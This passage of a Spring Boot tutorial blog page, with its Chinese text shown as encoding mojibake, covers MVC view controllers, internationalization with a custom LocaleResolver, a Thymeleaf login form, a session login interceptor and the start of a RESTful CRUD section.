class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//ä½¿ç”¨WebMvcConfigurerAdapterå¯ä»¥æ¥æ‰©å±•SpringMVCçš„åŠŸèƒ½</span></span><br><span class="line"><span class="comment">//@EnableWebMvc   ä¸è¦æ¥ç®¡SpringMVC</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyMvcConfig</span> <span class="keyword">extends</span> <span class="title class_">WebMvcConfigurerAdapter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> &#123;</span><br><span class="line">       <span class="comment">// super.addViewControllers(registry);</span></span><br><span class="line">        <span class="comment">//æµè§ˆå™¨å‘é€ /atguigu è¯·æ±‚æ¥åˆ° success</span></span><br><span class="line">        registry.addViewController(<span class="string">&quot;/atguigu&quot;</span>).setViewName(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ‰€æœ‰çš„WebMvcConfigurerAdapterç»„ä»¶éƒ½ä¼šä¸€èµ·èµ·ä½œç”¨</span></span><br><span class="line">    <span class="meta">@Bean</span> <span class="comment">//å°†ç»„ä»¶æ³¨å†Œåœ¨å®¹å™¨</span></span><br><span class="line">    <span class="keyword">public</span> WebMvcConfigurerAdapter <span class="title function_">webMvcConfigurerAdapter</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">WebMvcConfigurerAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebMvcConfigurerAdapter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> &#123;</span><br><span class="line">                registry.addViewController(<span class="string">&quot;/&quot;</span>).setViewName(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">                registry.addViewController(<span class="string">&quot;/index.html&quot;</span>).setViewName(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> adapter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="2-å›½é™…åŒ–">2ï¼‰ã€å›½é™…åŒ–</span></h3><p><strong>1ï¼‰ã€ç¼–å†™å›½é™…åŒ–é…ç½®æ–‡ä»¶ï¼›</strong></p><p>2ï¼‰ã€ä½¿ç”¨ResourceBundleMessageSourceç®¡ç†å›½é™…åŒ–èµ„æºæ–‡ä»¶</p><p>3ï¼‰ã€åœ¨é¡µé¢ä½¿ç”¨fmt:messageå–å‡ºå›½é™…åŒ–å†…å®¹</p><p>æ­¥éª¤ï¼š</p><p>1ï¼‰ã€ç¼–å†™å›½é™…åŒ–é…ç½®æ–‡ä»¶ï¼ŒæŠ½å–é¡µé¢éœ€è¦æ˜¾ç¤ºçš„å›½é™…åŒ–æ¶ˆæ¯</p><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180211130721.png"></p><p>2ï¼‰ã€SpringBootè‡ªåŠ¨é…ç½®å¥½äº†ç®¡ç†å›½é™…åŒ–èµ„æºæ–‡ä»¶çš„ç»„ä»¶ï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;spring.messages&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MessageSourceAutoConfiguration</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Comma-separated list of basenames (essentially a fully-qualified classpath</span></span><br><span class="line"><span class="comment"> * location), each following the ResourceBundle convention with relaxed support for</span></span><br><span class="line"><span class="comment"> * slash based locations. If it doesn&#x27;t contain a package qualifier (such as</span></span><br><span class="line"><span class="comment"> * &quot;org.mypackage&quot;), it will be resolved from the classpath root.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">basename</span> <span class="operator">=</span> <span class="string">&quot;messages&quot;</span>;  </span><br><span class="line">    <span class="comment">//æˆ‘ä»¬çš„é…ç½®æ–‡ä»¶å¯ä»¥ç›´æ¥æ”¾åœ¨ç±»è·¯å¾„ä¸‹å«messages.propertiesï¼›</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> MessageSource <span class="title function_">messageSource</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">ResourceBundleMessageSource</span> <span class="variable">messageSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceBundleMessageSource</span>();</span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasText(<span class="built_in">this</span>.basename)) &#123;</span><br><span class="line">            <span class="comment">//è®¾ç½®å›½é™…åŒ–èµ„æºæ–‡ä»¶çš„åŸºç¡€åï¼ˆå»æ‰è¯­è¨€å›½å®¶ä»£ç çš„ï¼‰</span></span><br><span class="line">messageSource.setBasenames(StringUtils.commaDelimitedListToStringArray(</span><br><span class="line">StringUtils.trimAllWhitespace(<span class="built_in">this</span>.basename)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.encoding != <span class="literal">null</span>) &#123;</span><br><span class="line">messageSource.setDefaultEncoding(<span class="built_in">this</span>.encoding.name());</span><br><span class="line">&#125;</span><br><span class="line">messageSource.setFallbackToSystemLocale(<span class="built_in">this</span>.fallbackToSystemLocale);</span><br><span class="line">messageSource.setCacheSeconds(<span class="built_in">this</span>.cacheSeconds);</span><br><span class="line">messageSource.setAlwaysUseMessageFormat(<span class="built_in">this</span>.alwaysUseMessageFormat);</span><br><span class="line"><span class="keyword">return</span> messageSource;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3ï¼‰ã€å»é¡µé¢è·å–å›½é™…åŒ–çš„å€¼ï¼›</p><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180211134506.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>  <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;author&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Signin Template for Bootstrap<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Bootstrap core CSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;asserts/css/bootstrap.min.css&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/webjars/bootstrap/4.0.0/css/bootstrap.css&#125;&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Custom styles for this template --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;asserts/css/signin.css&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/asserts/css/signin.css&#125;&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">&quot;text-center&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;form-signin&quot;</span> <span class="attr">action</span>=<span class="string">&quot;dashboard.html&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;mb-4&quot;</span> <span class="attr">th:src</span>=<span class="string">&quot;@&#123;/asserts/img/bootstrap-solid.svg&#125;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;asserts/img/bootstrap-solid.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">width</span>=<span class="string">&quot;72&quot;</span> <span class="attr">height</span>=<span class="string">&quot;72&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;h3 mb-3 font-weight-normal&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;#&#123;login.tip&#125;&quot;</span>&gt;</span>Please sign in<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">&quot;sr-only&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;#&#123;login.username&#125;&quot;</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span> <span class="attr">th:placeholder</span>=<span class="string">&quot;#&#123;login.username&#125;&quot;</span> <span class="attr">required</span>=<span class="string">&quot;&quot;</span> <span class="attr">autofocus</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">&quot;sr-only&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;#&#123;login.password&#125;&quot;</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span> <span class="attr">th:placeholder</span>=<span class="string">&quot;#&#123;login.password&#125;&quot;</span> <span class="attr">required</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;checkbox mb-3&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;remember-me&quot;</span>/&gt;</span> [[#&#123;login.remember&#125;]]</span><br><span class="line">        <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-lg btn-primary btn-block&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;#&#123;login.btn&#125;&quot;</span>&gt;</span>Sign in<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;mt-5 mb-3 text-muted&quot;</span>&gt;</span>Â© 2017-2018<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-sm&quot;</span>&gt;</span>ä¸­æ–‡<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-sm&quot;</span>&gt;</span>English<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ•ˆæœï¼šæ ¹æ®æµè§ˆå™¨è¯­è¨€è®¾ç½®çš„ä¿¡æ¯åˆ‡æ¢äº†å›½é™…åŒ–ï¼›</p><p>åŸç†ï¼š</p><p>â€‹å›½é™…åŒ–Localeï¼ˆåŒºåŸŸä¿¡æ¯å¯¹è±¡ï¼‰ï¼›LocaleResolverï¼ˆè·å–åŒºåŸŸä¿¡æ¯å¯¹è±¡ï¼‰ï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty(prefix = &quot;spring.mvc&quot;, name = &quot;locale&quot;)</span></span><br><span class="line"><span class="keyword">public</span> LocaleResolver <span class="title function_">localeResolver</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.mvcProperties</span><br><span class="line">.getLocaleResolver() == WebMvcProperties.LocaleResolver.FIXED) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FixedLocaleResolver</span>(<span class="built_in">this</span>.mvcProperties.getLocale());</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">AcceptHeaderLocaleResolver</span> <span class="variable">localeResolver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AcceptHeaderLocaleResolver</span>();</span><br><span class="line">localeResolver.setDefaultLocale(<span class="built_in">this</span>.mvcProperties.getLocale());</span><br><span class="line"><span class="keyword">return</span> localeResolver;</span><br><span class="line">&#125;</span><br><span class="line">é»˜è®¤çš„å°±æ˜¯æ ¹æ®è¯·æ±‚å¤´å¸¦æ¥çš„åŒºåŸŸä¿¡æ¯è·å–Localeè¿›è¡Œå›½é™…åŒ–</span><br></pre></td></tr></table></figure><p>4ï¼‰ã€ç‚¹å‡»é“¾æ¥åˆ‡æ¢å›½é™…åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¯ä»¥åœ¨è¿æ¥ä¸Šæºå¸¦åŒºåŸŸä¿¡æ¯</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyLocaleResolver</span> <span class="keyword">implements</span> <span class="title class_">LocaleResolver</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Locale <span class="title function_">resolveLocale</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">l</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;l&quot;</span>);</span><br><span class="line">        <span class="type">Locale</span> <span class="variable">locale</span> <span class="operator">=</span> Locale.getDefault();</span><br><span class="line">        <span class="keyword">if</span>(!StringUtils.isEmpty(l))&#123;</span><br><span class="line">            String[] split = l.split(<span class="string">&quot;_&quot;</span>);</span><br><span class="line">            locale = <span class="keyword">new</span> <span class="title class_">Locale</span>(split[<span class="number">0</span>],split[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> locale;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLocale</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Locale locale)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> LocaleResolver <span class="title function_">localeResolver</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyLocaleResolver</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="3-ç™»é™†">3ï¼‰ã€ç™»é™†</span></h3><p>å¼€å‘æœŸé—´æ¨¡æ¿å¼•æ“é¡µé¢ä¿®æ”¹ä»¥åï¼Œè¦å®æ—¶ç”Ÿæ•ˆ</p><p>1ï¼‰ã€ç¦ç”¨æ¨¡æ¿å¼•æ“çš„ç¼“å­˜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ç¦ç”¨ç¼“å­˜</span><br><span class="line">spring.thymeleaf.cache=false </span><br></pre></td></tr></table></figure><p>2ï¼‰ã€é¡µé¢ä¿®æ”¹å®Œæˆä»¥åctrl+f9ï¼šé‡æ–°ç¼–è¯‘ï¼›</p><p>ç™»é™†é”™è¯¯æ¶ˆæ¯çš„æ˜¾ç¤º</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color: red&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;msg&#125;&quot;</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;not #strings.isEmpty(msg)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3><span id="4-æ‹¦æˆªå™¨è¿›è¡Œç™»é™†æ£€æŸ¥">4ï¼‰ã€æ‹¦æˆªå™¨è¿›è¡Œç™»é™†æ£€æŸ¥</span></h3><p>æ‹¦æˆªå™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ç™»é™†æ£€æŸ¥ï¼Œ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginHandlerInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="comment">//ç›®æ ‡æ–¹æ³•æ‰§è¡Œä¹‹å‰</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> request.getSession().getAttribute(<span class="string">&quot;loginUser&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(user == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//æœªç™»é™†ï¼Œè¿”å›ç™»é™†é¡µé¢</span></span><br><span class="line">            request.setAttribute(<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;æ²¡æœ‰æƒé™è¯·å…ˆç™»é™†&quot;</span>);</span><br><span class="line">            request.getRequestDispatcher(<span class="string">&quot;/index.html&quot;</span>).forward(request,response);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//å·²ç™»é™†ï¼Œæ”¾è¡Œè¯·æ±‚</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨å†Œæ‹¦æˆªå™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ‰€æœ‰çš„WebMvcConfigurerAdapterç»„ä»¶éƒ½ä¼šä¸€èµ·èµ·ä½œç”¨</span></span><br><span class="line">  <span class="meta">@Bean</span> <span class="comment">//å°†ç»„ä»¶æ³¨å†Œåœ¨å®¹å™¨</span></span><br><span class="line">  <span class="keyword">public</span> WebMvcConfigurerAdapter <span class="title function_">webMvcConfigurerAdapter</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="type">WebMvcConfigurerAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebMvcConfigurerAdapter</span>() &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> &#123;</span><br><span class="line">              registry.addViewController(<span class="string">&quot;/&quot;</span>).setViewName(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">              registry.addViewController(<span class="string">&quot;/index.html&quot;</span>).setViewName(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">              registry.addViewController(<span class="string">&quot;/main.html&quot;</span>).setViewName(<span class="string">&quot;dashboard&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">//æ³¨å†Œæ‹¦æˆªå™¨</span></span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">              <span class="comment">//super.addInterceptors(registry);</span></span><br><span class="line">              <span class="comment">//é™æ€èµ„æºï¼›  *.css , *.js</span></span><br><span class="line">              <span class="comment">//SpringBootå·²ç»åšå¥½äº†é™æ€èµ„æºæ˜ å°„</span></span><br><span class="line">              registry.addInterceptor(<span class="keyword">new</span> <span class="title class_">LoginHandlerInterceptor</span>()).addPathPatterns(<span class="string">&quot;/**&quot;</span>)</span><br><span class="line">                      .excludePathPatterns(<span class="string">&quot;/index.html&quot;</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot;/user/login&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">return</span> adapter;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3><span id="5-crud-å‘˜å·¥åˆ—è¡¨">5ï¼‰ã€CRUD-å‘˜å·¥åˆ—è¡¨</span></h3><p>å®éªŒè¦æ±‚ï¼š</p><p>1ï¼‰ã€RestfulCRUDï¼šCRUDæ»¡è¶³Resté£æ ¼ï¼›</p><p>URIï¼š  &#x2F;èµ„æºåç§°&#x2F;èµ„æºæ ‡è¯†       HTTPè¯·æ±‚æ–¹å¼åŒºåˆ†å¯¹èµ„æºCRUDæ“ä½œ</p><table><thead><tr><th></th><th>æ™®é€šCRUDï¼ˆuriæ¥åŒºåˆ†æ“ä½œï¼‰</th><th>RestfulCRUD</th></tr></thead><tbody><tr><td>æŸ¥è¯¢</td><td>getEmp</td><td>empâ€”GET</td></tr><tr><td>æ·»åŠ </td><td>addEmp?xxx</td><td>empâ€”POST</td></tr><tr><td>ä¿®æ”¹</td><td>updateEmp?id&#x3D;xxx&amp;xxx&#x3D;xx</td><td>emp&#x2F;{id}â€”PUT</td></tr><tr><td>åˆ 